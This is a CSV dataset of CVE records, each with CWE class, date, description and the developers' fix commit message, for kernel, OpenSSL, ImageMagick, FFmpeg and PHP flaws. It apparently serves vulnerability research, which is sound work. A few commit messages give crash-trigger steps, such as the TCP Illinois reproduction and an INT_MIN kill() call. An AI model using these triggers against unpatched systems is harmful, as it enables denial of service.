cveID,cweID,publishedDate,cveDescription,commitMsg
CVE-2014-4014,CWE-264,2014-06-23,"The capabilities implementation in the Linux kernel before 3.14.8 does not properly consider that namespaces are inapplicable to inodes, which allows local users to bypass intended chmod restrictions by first creating a user namespace, as demonstrated by setting the setgid bit on a file with group ownership of root.","The kernel has no concept of capabilities with respect to inodes; inodes exist independently of namespaces.  For example, inode_capable(inode, CAP_LINUX_IMMUTABLE) would be nonsense.  This patch changes inode_capable to check for uid and gid mappings and renames it to capable_wrt_inode_uidgid, which should make it more obvious what it does.  Fixes CVE-2014-4014.  Cc: Theodore Ts'o <tytso@mit.edu> Cc: Serge Hallyn <serge.hallyn@ubuntu.com> Cc: ""Eric W. Biederman"" <ebiederm@xmission.com> Cc: Dave Chinner <david@fromorbit.com> Cc: stable@vger.kernel.org Signed-off-by: Andy Lutomirski <luto@amacapital.net> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-7495,CWE-200,2017-05-15,"fs/ext4/inode.c in the Linux kernel before 4.6.2, when ext4 data=ordered mode is used, mishandles a needs-flushing-before-commit list, which allows local users to obtain sensitive information from other users' files in opportunistic circumstances by waiting for a hardware reset, creating a new file, making write system calls, and reading this file.","Huang has reported that in his powerfail testing he is seeing stale block contents in some of recently allocated blocks although he mounts ext4 in data=ordered mode. After some investigation I have found out that indeed when delayed allocation is used, we don't add inode to transaction's list of inodes needing flushing before commit. Originally we were doing that but commit f3b5929 removed the logic with a flawed argument that it is not needed.  The problem is that although for delayed allocated blocks we write their contents immediately after allocating them, there is no guarantee that the IO scheduler or device doesn't reorder things and thus transaction allocating blocks and attaching them to inode can reach stable storage before actual block contents. Actually whenever we attach freshly allocated blocks to inode using a written extent, we should add inode to transaction's ordered inode list to make sure we properly wait for block contents to be written before committing the transaction. So that is what we do in this patch. This also handles other cases where stale data exposure was possible - like filling hole via mmap in data=ordered,nodelalloc mode.  The only exception to the above rule are extending direct IO writes where blkdev_direct_IO() waits for IO to complete before increasing i_size and thus stale data exposure is not possible. For now we don't complicate the code with optimizing this special case since the overhead is pretty low. In case this is observed to be a performance problem we can always handle it using a special flag to ext4_map_blocks().  CC: stable@vger.kernel.org Fixes: f3b5929 Reported-by: ""HUANG Weller (CM/ESW12-CN)"" <Weller.Huang@cn.bosch.com> Tested-by: ""HUANG Weller (CM/ESW12-CN)"" <Weller.Huang@cn.bosch.com> Signed-off-by: Jan Kara <jack@suse.cz> Signed-off-by: Theodore Ts'o <tytso@mit.edu>"
CVE-2018-18386,CWE-704,2018-10-17,drivers/tty/n_tty.c in the Linux kernel before 4.14.11 allows local attackers (who are able to access pseudo terminals) to hang/block further usage of any pseudo terminal devices due to an EXTPROC versus ICANON confusion in TIOCINQ.,"We added support for EXTPROC back in 2010 in commit 26df6d1 (""tty: Add EXTPROC support for LINEMODE"") and the intent was to allow it to override some (all?) ICANON behavior.  Quoting from that original commit message:           There is a new bit in the termios local flag word, EXTPROC.          When this bit is set, several aspects of the terminal driver          are disabled.  Input line editing, character echo, and mapping          of signals are all disabled.  This allows the telnetd to turn          off these functions when in linemode, but still keep track of          what state the user wants the terminal to be in.  but the problem turns out that ""several aspects of the terminal driver are disabled"" is a bit ambiguous, and you can really confuse the n_tty layer by setting EXTPROC and then causing some of the ICANON invariants to no longer be maintained.  This fixes at least one such case (TIOCINQ) becoming unhappy because of the confusion over whether ICANON really means ICANON when EXTPROC is set.  This basically makes TIOCINQ match the case of read: if EXTPROC is set, we ignore ICANON.  Also, make sure to reset the ICANON state ie EXTPROC changes, not just if ICANON changes.  Fixes: 26df6d1 (""tty: Add EXTPROC support for LINEMODE"") Reported-by: Tetsuo Handa <penguin-kernel@i-love.sakura.ne.jp> Reported-by: syzkaller <syzkaller@googlegroups.com> Cc: Jiri Slaby <jslaby@suse.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2016-9539,CWE-119,2016-11-22,tools/tiffcrop.c in libtiff 4.0.6 has an out-of-bounds read in readContigTilesIntoBuffer(). Reported as MSVR 35092.,readContigTilesIntoBuffer(). Reported as MSVR 35092 by Axel Souchet & Vishal Chauhan from the MSRC Vulnerabilities & Mitigations team.
CVE-2010-4650,CWE-119,2012-06-21,Buffer overflow in the fuse_do_ioctl function in fs/fuse/file.c in the Linux kernel before 2.6.37 allows local users to cause a denial of service or possibly have unspecified other impact by leveraging the ability to operate a CUSE server.,Verify that the total length of the iovec returned in FUSE_IOCTL_RETRY doesn't overflow iov_length().  Signed-off-by: Miklos Szeredi <mszeredi@suse.cz> CC: Tejun Heo <tj@kernel.org> CC: <stable@kernel.org>         [2.6.31+]
CVE-2014-8176,CWE-119,2015-06-12,"The dtls1_clear_queues function in ssl/d1_lib.c in OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h frees data structures without considering that application data can arrive between a ChangeCipherSpec message and a Finished message, which allows remote DTLS peers to cause a denial of service (memory corruption and application crash) or possibly have unspecified other impact via unexpected application data.",PR#3286
CVE-2016-2842,CWE-119,2016-03-03,"The doapr_outch function in crypto/bio/b_print.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g does not verify that a certain memory allocation succeeds, which allows remote attackers to cause a denial of service (out-of-bounds write or memory consumption) or possibly have unspecified other impact via a long string, as demonstrated by a large amount of ASN.1 data, a different vulnerability than CVE-2016-0799.",
CVE-2016-10158,CWE-189,2017-01-24,"The exif_convert_any_to_int function in ext/exif/exif.c in PHP before 5.6.30, 7.0.x before 7.0.15, and 7.1.x before 7.1.1 allows remote attackers to cause a denial of service (application crash) via crafted EXIF data that triggers an attempt to divide the minimum representable negative integer by -1.",
CVE-2010-4707,CWE-399,2011-01-24,"The check_acl function in pam_xauth.c in the pam_xauth module in Linux-PAM (aka pam) 1.1.2 and earlier does not verify that a certain ACL file is a regular file, which might allow local users to cause a denial of service (resource consumption) via a special file.",
CVE-2011-4621,CWE-835,2012-05-17,"The Linux kernel before 2.6.37 does not properly implement a certain clock-update optimization, which allows local users to cause a denial of service (system hang) via an application that executes code in a loop.","idle_balance() drops/retakes rq->lock, leaving the previous task vulnerable to set_tsk_need_resched().  Clear it after we return from balancing instead, and in setup_thread_stack() as well, so no successfully descheduled or never scheduled task has it set.  Need resched confused the skip_clock_update logic, which assumes that the next call to update_rq_clock() will come nearly immediately after being set.  Make the optimization robust against the waking a sleeper before it sucessfully deschedules case by checking that the current task has not been dequeued before setting the flag, since it is that useless clock update we're trying to save, and clear unconditionally in schedule() proper instead of conditionally in put_prev_task().  Signed-off-by: Mike Galbraith <efault@gmx.de> Reported-by: Bjoern B. Brandenburg <bbb.lst@gmail.com> Tested-by: Yong Zhang <yong.zhang0@gmail.com> Signed-off-by: Peter Zijlstra <a.p.zijlstra@chello.nl> Cc: stable@kernel.org LKML-Reference: <1291802742.1417.9.camel@marge.simson.net> Signed-off-by: Ingo Molnar <mingo@elte.hu>"
CVE-2017-9993,CWE-200,2017-06-28,"FFmpeg before 2.8.12, 3.0.x and 3.1.x before 3.1.9, 3.2.x before 3.2.6, and 3.3.x before 3.3.2 does not properly restrict HTTP Live Streaming filename extensions and demuxer names, which allows attackers to read arbitrary files via crafted playlist data.",This prevents part of one exploit leading to an information leak  Found-by: Emil Lerner and Pavel Cheremushkin Reported-by: Thierry Foucu <tfoucu@google.com>  Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2016-4485,CWE-200,2016-05-23,"The llc_cmsg_rcv function in net/llc/af_llc.c in the Linux kernel before 4.5.5 does not initialize a certain data structure, which allows attackers to obtain sensitive information from kernel stack memory by reading a message.",The stack object “info” has a total size of 12 bytes. Its last byte is padding which is not initialized and leaked via “put_cmsg”.  Signed-off-by: Kangjie Lu <kjlu@gatech.edu> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2015-5330,CWE-200,2015-12-29,"ldb before 1.1.24, as used in the AD LDAP server in Samba 4.x before 4.1.22, 4.2.x before 4.2.7, and 4.3.x before 4.3.3, mishandles string lengths, which allows remote attackers to obtain sensitive information from daemon heap memory by sending crafted packets and then reading (1) an error message or (2) a database value.",
CVE-2014-3569,,2014-12-24,"The ssl23_get_client_hello function in s23_srvr.c in OpenSSL 0.9.8zc, 1.0.0o, and 1.0.1j does not properly handle attempts to use unsupported protocols, which allows remote attackers to cause a denial of service (NULL pointer dereference and daemon crash) via an unexpected handshake, as demonstrated by an SSLv3 handshake to a no-ssl3 application with certain error handling.  NOTE: this issue became relevant after the CVE-2014-3568 fix.",
CVE-2012-3525,CWE-20,2012-08-25,"s2s/out.c in jabberd2 2.2.16 and earlier does not verify that a request was made for an XMPP Server Dialback response, which allows remote XMPP servers to spoof domains via a (1) Verify Response or (2) Authorization Response.",
CVE-2017-12663,CWE-772,2017-08-07,ImageMagick 7.0.6-2 has a memory leak vulnerability in WriteMAPImage in coders/map.c.,
CVE-2017-8807,CWE-119,2017-11-16,vbf_stp_error in bin/varnishd/cache/cache_fetch.c in Varnish HTTP Cache 4.1.x before 4.1.9 and 5.x before 5.2.1 allows remote attackers to obtain sensitive information from process memory because a VFP_GetStorage buffer is larger than intended in certain circumstances involving -sfile Stevedore transient objects.,"The file stevedore may return a buffer larger than asked for when requesting storage. Due to lack of check for this condition, the code to copy the synthetic error memory buffer from vcl_error would overrun the buffer.  Patch by @shamger Fixes: #2429"
CVE-2016-5243,CWE-200,2016-06-27,"The tipc_nl_compat_link_dump function in net/tipc/netlink_compat.c in the Linux kernel through 4.6.3 does not properly copy a certain string, which allows local users to obtain sensitive information from kernel stack memory by reading a Netlink message.",link_info.str is a char array of size 60. Memory after the NULL byte is not initialized. Sending the whole object out can cause a leak.  Signed-off-by: Kangjie Lu <kjlu@gatech.edu> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2016-8666,CWE-400,2016-10-16,"The IP stack in the Linux kernel before 4.6 allows remote attackers to cause a denial of service (stack consumption and panic) or possibly have unspecified other impact by triggering use of the GRO path for packets with tunnel stacking, as demonstrated by interleaved IPv4 headers and GRE headers, a related issue to CVE-2016-7039.","When drivers express support for TSO of encapsulated packets, they only mean that they can do it for one layer of encapsulation. Supporting additional levels would mean updating, at a minimum, more IP length fields and they are unaware of this.  No encapsulation device expresses support for handling offloaded encapsulated packets, so we won't generate these types of frames in the transmit path. However, GRO doesn't have a check for multiple levels of encapsulation and will attempt to build them.  UDP tunnel GRO actually does prevent this situation but it only handles multiple UDP tunnels stacked on top of each other. This generalizes that solution to prevent any kind of tunnel stacking that would cause problems.  Fixes: bf5a755 (""net-gre-gro: Add GRE support to the GRO stack"") Signed-off-by: Jesse Gross <jesse@kernel.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2019-13136,CWE-190,2019-07-01,ImageMagick before 7.0.8-50 has an integer overflow vulnerability in the function TIFFSeekCustomStream in coders/tiff.c.,
CVE-2016-2179,CWE-399,2016-09-16,"The DTLS implementation in OpenSSL before 1.1.0 does not properly restrict the lifetime of queue entries associated with unused out-of-order messages, which allows remote attackers to cause a denial of service (memory consumption) by maintaining many crafted DTLS sessions simultaneously, related to d1_lib.c, statem_dtls.c, statem_lib.c, and statem_srvr.c.",
CVE-2016-4804,CWE-119,2016-06-03,"The read_boot function in boot.c in dosfstools before 4.0 allows attackers to cause a denial of service (crash) via a crafted filesystem, which triggers a heap-based buffer overflow in the (1) read_fat function or an out-of-bounds heap read in (2) get_fat function.","The variable used for storing the FAT size (in bytes) was an unsigned int. Since the size in sectors read from the BPB was not sufficiently checked, this could end up being zero after multiplying it with the sector size while some offsets still stayed excessive. Ultimately it would cause segfaults when accessing FAT entries for which no memory was allocated.  Make it more robust by changing the types used to store FAT size to off_t and abort if there is no room for data clusters. Additionally check that FAT size is not specified as zero.  Fixes #25 and fixes #26.  Reported-by: Hanno Böck Signed-off-by: Andreas Bombe <aeb@debian.org>"
CVE-2016-7525,CWE-125,2017-04-20,Heap-based buffer overflow in coders/psd.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted PSD file.,
CVE-2012-4565,CWE-189,2012-12-21,"The tcp_illinois_info function in net/ipv4/tcp_illinois.c in the Linux kernel before 3.4.19, when the net.ipv4.tcp_congestion_control illinois setting is enabled, allows local users to cause a denial of service (divide-by-zero error and OOPS) by reading TCP stats.","Reading TCP stats when using TCP Illinois congestion control algorithm can cause a divide by zero kernel oops.  The division by zero occur in tcp_illinois_info() at:  do_div(t, ca->cnt_rtt); where ca->cnt_rtt can become zero (when rtt_reset is called)  Steps to Reproduce:  1. Register tcp_illinois:      # sysctl -w net.ipv4.tcp_congestion_control=illinois  2. Monitor internal TCP information via command ""ss -i""      # watch -d ss -i  3. Establish new TCP conn to machine  Either it fails at the initial conn, or else it needs to wait for a loss or a reset.  This is only related to reading stats.  The function avg_delay() also performs the same divide, but is guarded with a (ca->cnt_rtt > 0) at its calling point in update_params().  Thus, simply fix tcp_illinois_info().  Function tcp_illinois_info() / get_info() is called without socket lock.  Thus, eliminate any race condition on ca->cnt_rtt by using a local stack variable.  Simply reuse info.tcpv_rttcnt, as its already set to ca->cnt_rtt. Function avg_delay() is not affected by this race condition, as its called with the socket lock.  Cc: Petr Matousek <pmatouse@redhat.com> Signed-off-by: Jesper Dangaard Brouer <brouer@redhat.com> Acked-by: Eric Dumazet <edumazet@google.com> Acked-by: Stephen Hemminger <shemminger@vyatta.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-14767,CWE-119,2017-09-27,"The sdp_parse_fmtp_config_h264 function in libavformat/rtpdec_h264.c in FFmpeg before 3.3.4 mishandles empty sprop-parameter-sets values, which allows remote attackers to cause a denial of service (heap buffer overflow) or possibly have unspecified other impact via a crafted sdp file.",Fixes: rtp_sdp/poc.sdp  Found-by: Bingchang <l.bing.chang.bc@gmail.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2016-2085,CWE-19,2016-04-27,"The evm_verify_hmac function in security/integrity/evm/evm_main.c in the Linux kernel before 4.5 does not properly copy data, which makes it easier for local users to forge MAC values via a timing side-channel attack.","This patch fixes vulnerability CVE-2016-2085.  The problem exists because the vm_verify_hmac() function includes a use of memcmp(). Unfortunately, this allows timing side channel attacks; specifically a MAC forgery complexity drop from 2^128 to 2^12.  This patch changes the memcmp() to the cryptographically safe crypto_memneq().  Reported-by: Xiaofei Rex Guo <xiaofei.rex.guo@intel.com> Signed-off-by: Ryan Ware <ware@linux.intel.com> Cc: stable@vger.kernel.org Signed-off-by: Mimi Zohar <zohar@linux.vnet.ibm.com> Signed-off-by: James Morris <james.l.morris@oracle.com>"
CVE-2017-7541,CWE-119,2017-07-25,The brcmf_cfg80211_mgmt_tx function in drivers/net/wireless/broadcom/brcm80211/brcmfmac/cfg80211.c in the Linux kernel before 4.12.3 allows local users to cause a denial of service (buffer overflow and system crash) or possibly gain privileges via a crafted NL80211_CMD_FRAME Netlink packet.,"The lower level nl80211 code in cfg80211 ensures that ""len"" is between 25 and NL80211_ATTR_FRAME (2304).  We subtract DOT11_MGMT_HDR_LEN (24) from ""len"" so thats's max of 2280.  However, the action_frame->data[] buffer is only BRCMF_FIL_ACTION_FRAME_SIZE (1800) bytes long so this memcpy() can overflow.  	memcpy(action_frame->data, &buf[DOT11_MGMT_HDR_LEN], 	       le16_to_cpu(action_frame->len));  Cc: stable@vger.kernel.org # 3.9.x Fixes: 18e2f61 (""brcmfmac: P2P action frame tx."") Reported-by: ""freenerguo(郭大兴)"" <freenerguo@tencent.com> Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-3951,,2016-05-02,Double free vulnerability in drivers/net/usb/cdc_ncm.c in the Linux kernel before 4.5 allows physically proximate attackers to cause a denial of service (system crash) or possibly have unspecified other impact by inserting a USB device with an invalid USB descriptor.,"usbnet_link_change will call schedule_work and should be avoided if bind is failing. Otherwise we will end up with scheduled work referring to a netdev which has gone away.  Instead of making the call conditional, we can just defer it to usbnet_probe, using the driver_info flag made for this purpose.  Fixes: 8a34b0a (""usbnet: cdc_ncm: apply usbnet_link_change"") Reported-by: Andrey Konovalov <andreyknvl@gmail.com> Suggested-by: Linus Torvalds <torvalds@linux-foundation.org> Signed-off-by: Bjørn Mork <bjorn@mork.no> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2015-8898,CWE-476,2017-03-15,The WriteImages function in magick/constitute.c in ImageMagick before 6.9.2-4 allows remote attackers to cause a denial of service (NULL pointer dereference) via a crafted image file.,
CVE-2017-6542,CWE-119,2017-03-27,"The ssh_agent_channel_data function in PuTTY before 0.68 allows remote attackers to have unspecified impact via a large length value in an agent protocol message and leveraging the ability to connect to the Unix-domain socket representing the forwarded agent connection, which trigger a buffer overflow.",
CVE-2016-9601,CWE-119,2018-04-24,"ghostscript before version 9.21 is vulnerable to a heap based buffer overflow that was found in the ghostscript jbig2_decode_gray_scale_image function which is used to decode halftone segments in a JBIG2 image. A document (PostScript or PDF) with an embedded, specially crafted, jbig2 image could trigger a segmentation fault in ghostscript.",
CVE-2018-12633,CWE-362,2018-06-22,"An issue was discovered in the Linux kernel through 4.17.2. vbg_misc_device_ioctl() in drivers/virt/vboxguest/vboxguest_linux.c reads the same user data twice with copy_from_user. The header part of the user data is double-fetched, and a malicious user thread can tamper with the critical variables (hdr.size_in and hdr.size_out) in the header between the two fetches because of a race condition, leading to severe kernel errors, such as buffer over-accesses. This bug can cause a local denial of service and information leakage.","In vbg_misc_device_ioctl(), the header of the ioctl argument is copied from the userspace pointer 'arg' and saved to the kernel object 'hdr'. Then the 'version', 'size_in', and 'size_out' fields of 'hdr' are verified.  Before this commit, after the checks a buffer for the entire request would be allocated and then all data including the verified header would be copied from the userspace 'arg' pointer again.  Given that the 'arg' pointer resides in userspace, a malicious userspace process can race to change the data pointed to by 'arg' between the two copies. By doing so, the user can bypass the verifications on the ioctl argument.  This commit fixes this by using the already checked copy of the header to fill the header part of the allocated buffer and only copying the remainder of the data from userspace.  Signed-off-by: Wenwen Wang <wang6495@umn.edu> Reviewed-by: Hans de Goede <hdegoede@redhat.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2016-2187,,2016-05-02,The gtco_probe function in drivers/input/tablet/gtco.c in the Linux kernel through 4.5.2 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) via a crafted endpoints value in a USB device descriptor.,"The gtco driver expects at least one valid endpoint. If given malicious descriptors that specify 0 for the number of endpoints, it will crash in the probe function. Ensure there is at least one endpoint on the interface before using it.  Also let's fix a minor coding style issue.  The full correct report of this issue can be found in the public Red Hat Bugzilla:  https://bugzilla.redhat.com/show_bug.cgi?id=1283385  Reported-by: Ralf Spenneberg <ralf@spenneberg.net> Signed-off-by: Vladis Dronov <vdronov@redhat.com> Cc: stable@vger.kernel.org Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>"
CVE-2017-16527,CWE-416,2017-11-04,sound/usb/mixer.c in the Linux kernel before 4.13.8 allows local users to cause a denial of service (snd_usb_mixer_interrupt use-after-free and system crash) or possibly have unspecified other impact via a crafted USB device.,"USB-audio driver may leave a stray URB for the mixer interrupt when it exits by some error during probe.  This leads to a use-after-free error as spotted by syzkaller like:   ==================================================================   BUG: KASAN: use-after-free in snd_usb_mixer_interrupt+0x604/0x6f0   Call Trace:    <IRQ>    __dump_stack lib/dump_stack.c:16    dump_stack+0x292/0x395 lib/dump_stack.c:52    print_address_description+0x78/0x280 mm/kasan/report.c:252    kasan_report_error mm/kasan/report.c:351    kasan_report+0x23d/0x350 mm/kasan/report.c:409    __asan_report_load8_noabort+0x19/0x20 mm/kasan/report.c:430    snd_usb_mixer_interrupt+0x604/0x6f0 sound/usb/mixer.c:2490    __usb_hcd_giveback_urb+0x2e0/0x650 drivers/usb/core/hcd.c:1779    ....    Allocated by task 1484:    save_stack_trace+0x1b/0x20 arch/x86/kernel/stacktrace.c:59    save_stack+0x43/0xd0 mm/kasan/kasan.c:447    set_track mm/kasan/kasan.c:459    kasan_kmalloc+0xad/0xe0 mm/kasan/kasan.c:551    kmem_cache_alloc_trace+0x11e/0x2d0 mm/slub.c:2772    kmalloc ./include/linux/slab.h:493    kzalloc ./include/linux/slab.h:666    snd_usb_create_mixer+0x145/0x1010 sound/usb/mixer.c:2540    create_standard_mixer_quirk+0x58/0x80 sound/usb/quirks.c:516    snd_usb_create_quirk+0x92/0x100 sound/usb/quirks.c:560    create_composite_quirk+0x1c4/0x3e0 sound/usb/quirks.c:59    snd_usb_create_quirk+0x92/0x100 sound/usb/quirks.c:560    usb_audio_probe+0x1040/0x2c10 sound/usb/card.c:618    ....    Freed by task 1484:    save_stack_trace+0x1b/0x20 arch/x86/kernel/stacktrace.c:59    save_stack+0x43/0xd0 mm/kasan/kasan.c:447    set_track mm/kasan/kasan.c:459    kasan_slab_free+0x72/0xc0 mm/kasan/kasan.c:524    slab_free_hook mm/slub.c:1390    slab_free_freelist_hook mm/slub.c:1412    slab_free mm/slub.c:2988    kfree+0xf6/0x2f0 mm/slub.c:3919    snd_usb_mixer_free+0x11a/0x160 sound/usb/mixer.c:2244    snd_usb_mixer_dev_free+0x36/0x50 sound/usb/mixer.c:2250    __snd_device_free+0x1ff/0x380 sound/core/device.c:91    snd_device_free_all+0x8f/0xe0 sound/core/device.c:244    snd_card_do_free sound/core/init.c:461    release_card_device+0x47/0x170 sound/core/init.c:181    device_release+0x13f/0x210 drivers/base/core.c:814    ....  Actually such a URB is killed properly at disconnection when the device gets probed successfully, and what we need is to apply it for the error-path, too.  In this patch, we apply snd_usb_mixer_disconnect() at releasing. Also introduce a new flag, disconnected, to struct usb_mixer_interface for not performing the disconnection procedure twice.  Reported-by: Andrey Konovalov <andreyknvl@google.com> Tested-by: Andrey Konovalov <andreyknvl@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>"
CVE-2013-4588,CWE-119,2013-11-20,"Multiple stack-based buffer overflows in net/netfilter/ipvs/ip_vs_ctl.c in the Linux kernel before 2.6.33, when CONFIG_IP_VS is used, allow local users to gain privileges by leveraging the CAP_NET_ADMIN capability for (1) a getsockopt system call, related to the do_ip_vs_get_ctl function, or (2) a setsockopt system call, related to the do_ip_vs_set_ctl function.","The ipvs code has a nifty system for doing the size of ioctl command copies; it defines an array with values into which it indexes the cmd to find the right length.  Unfortunately, the ipvs code forgot to check if the cmd was in the range that the array provides, allowing for an index outside of the array, which then gives a ""garbage"" result into the length, which then gets used for copying into a stack buffer.  Fix this by adding sanity checks on these as well as the copy size.  [ horms@verge.net.au: adjusted limit to IP_VS_SO_GET_MAX ] Signed-off-by: Arjan van de Ven <arjan@linux.intel.com> Acked-by: Julian Anastasov <ja@ssi.bg> Signed-off-by: Simon Horman <horms@verge.net.au> Signed-off-by: Patrick McHardy <kaber@trash.net>"
CVE-2017-11462,CWE-415,2017-09-13,Double free vulnerability in MIT Kerberos 5 (aka krb5) allows attackers to have unspecified impact via vectors involving automatic deletion of security contexts on error.,"After gss_init_sec_context() or gss_accept_sec_context() has created a context, don't delete the mechglue context on failures from subsequent calls, even if the mechanism deletes the mech-specific context (which is allowed by RFC 2744 but not preferred).  Check for union contexts with no mechanism context in each GSS function which accepts a gss_ctx_id_t.  CVE-2017-11462:  RFC 2744 permits a GSS-API implementation to delete an existing security context on a second or subsequent call to gss_init_sec_context() or gss_accept_sec_context() if the call results in an error.  This API behavior has been found to be dangerous, leading to the possibility of memory errors in some callers.  For safety, GSS-API implementations should instead preserve existing security contexts on error until the caller deletes them.  All versions of MIT krb5 prior to this change may delete acceptor contexts on error.  Versions 1.13.4 through 1.13.7, 1.14.1 through 1.14.5, and 1.15 through 1.15.1 may also delete initiator contexts on error.  ticket: 8598 (new) target_version: 1.15-next target_version: 1.14-next tags: pullup"
CVE-2017-9202,CWE-369,2017-05-23,"imagew-cmd.c:854:45 in libimageworsener.a in ImageWorsener 1.3.1 allows remote attackers to cause a denial of service (divide-by-zero error) via a crafted image, related to imagew-api.c.","Fixes a bug that could result in division by zero, at least for a JPEG source image. Fixes issues #19, #20"
CVE-2014-9870,CWE-264,2016-08-06,"The Linux kernel before 3.11 on ARM platforms, as used in Android before 2016-08-05 on Nexus 5 and 7 (2013) devices, does not properly consider user-space access to the TPIDRURW register, which allows local users to gain privileges via a crafted application, aka Android internal bug 28749743 and Qualcomm internal bug CR561044.","Since commit 6a1c531 the user writeable TLS register was zeroed to prevent it from being used as a covert channel between two tasks.  There are more and more applications coming to Windows RT, Wine could support them, but mostly they expect to have the thread environment block (TEB) in TPIDRURW.  This patch preserves that register per thread instead of clearing it. Unlike the TPIDRURO, which is already switched, the TPIDRURW can be updated from userspace so needs careful treatment in the case that we modify TPIDRURW and call fork(). To avoid this we must always read TPIDRURW in copy_thread.  Signed-off-by: André Hentschel <nerv@dawncrow.de> Signed-off-by: Will Deacon <will.deacon@arm.com> Signed-off-by: Jonathan Austin <jonathan.austin@arm.com> Signed-off-by: Russell King <rmk+kernel@arm.linux.org.uk>"
CVE-2016-2177,CWE-190,2016-06-20,"OpenSSL through 1.0.2h incorrectly uses pointer arithmetic for heap-buffer boundary checks, which might allow remote attackers to cause a denial of service (integer overflow and application crash) or possibly have unspecified other impact by leveraging unexpected malloc behavior, related to s3_srvr.c, ssl_sess.c, and t1_lib.c.",
CVE-2014-3710,CWE-20,2014-11-05,"The donote function in readelf.c in file through 5.20, as used in the Fileinfo component in PHP 5.4.34, does not ensure that sufficient note headers are present, which allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via a crafted ELF file.",
CVE-2017-18017,CWE-416,2018-01-03,"The tcpmss_mangle_packet function in net/netfilter/xt_TCPMSS.c in the Linux kernel before 4.11, and 4.9.x before 4.9.36, allows remote attackers to cause a denial of service (use-after-free and memory corruption) or possibly have unspecified other impact by leveraging the presence of xt_TCPMSS in an iptables action.","Denys provided an awesome KASAN report pointing to an use after free in xt_TCPMSS  I have provided three patches to fix this issue, either in xt_TCPMSS or in xt_tcpudp.c. It seems xt_TCPMSS patch has the smallest possible impact.  Signed-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Denys Fedoryshchenko <nuclearcat@nuclearcat.com> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>"
CVE-2018-1999011,CWE-119,2018-07-23,FFmpeg before commit 2b46ebdbff1d8dec7a3d8ea280a612b91a582869 contains a Buffer Overflow vulnerability in asf_o format demuxer that can result in heap-buffer-overflow that may result in remote code execution. This attack appears to be exploitable via specially crafted ASF file that has to be provided as input to FFmpeg. This vulnerability appears to have been fixed in 2b46ebdbff1d8dec7a3d8ea280a612b91a582869 and later.,Fixes: integer overflow and out of array access Fixes: asfo-crash-46080c4341572a7137a162331af77f6ded45cbd7  Found-by: Paul Ch <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2016-5354,CWE-476,2016-08-07,"The USB subsystem in Wireshark 1.12.x before 1.12.12 and 2.x before 2.0.4 mishandles class types, which allows remote attackers to cause a denial of service (application crash) via a crafted packet.",USB dissectors can't assume that only their class type has been passed around in the conversation.  Make explicit check that class type expected matches the dissector and stop/prevent dissection if there isn't a match.  Bug: 12356 Change-Id: Ib23973a4ebd0fbb51952ffc118daf95e3389a209 Reviewed-on: https://code.wireshark.org/review/15212 Petri-Dish: Michael Mann <mmann78@netscape.net> Reviewed-by: Martin Kaiser <wireshark@kaiser.cx> Petri-Dish: Martin Kaiser <wireshark@kaiser.cx> Tested-by: Petri Dish Buildbot <buildbot-no-reply@wireshark.org> Reviewed-by: Michael Mann <mmann78@netscape.net>
CVE-2018-10124,CWE-119,2018-04-16,"The kill_something_info function in kernel/signal.c in the Linux kernel before 4.13, when an unspecified architecture and compiler is used, might allow local users to cause a denial of service via an INT_MIN argument.","When running kill(72057458746458112, 0) in userspace I hit the following issue.    UBSAN: Undefined behaviour in kernel/signal.c:1462:11   negation of -2147483648 cannot be represented in type 'int':   CPU: 226 PID: 9849 Comm: test Tainted: G    B          ---- -------   3.10.0-327.53.58.70.x86_64_ubsan+ #116   Hardware name: Huawei Technologies Co., Ltd. RH8100 V3/BC61PBIA, BIOS BLHSV028 11/11/2014   Call Trace:     dump_stack+0x19/0x1b     ubsan_epilogue+0xd/0x50     __ubsan_handle_negate_overflow+0x109/0x14e     SYSC_kill+0x43e/0x4d0     SyS_kill+0xe/0x10     system_call_fastpath+0x16/0x1b  Add code to avoid the UBSAN detection.  [akpm@linux-foundation.org: tweak comment] Link: http://lkml.kernel.org/r/1496670008-59084-1-git-send-email-zhongjiang@huawei.com Signed-off-by: zhongjiang <zhongjiang@huawei.com> Cc: Oleg Nesterov <oleg@redhat.com> Cc: Michal Hocko <mhocko@kernel.org> Cc: Vlastimil Babka <vbabka@suse.cz> Cc: Xishi Qiu <qiuxishi@huawei.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2016-7537,CWE-125,2017-04-19,MagickCore/memory.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds access) via a crafted PDB file.,
CVE-2014-2020,CWE-189,2014-02-18,"ext/gd/gd.c in PHP 5.5.x before 5.5.9 does not check data types, which might allow remote attackers to obtain sensitive information by using a (1) string or (2) array data type in place of a numeric data type, as demonstrated by an imagecrop function call with a string for the x dimension value, a different vulnerability than CVE-2013-7226.",And also fixed the bug: arguments are altered after some calls
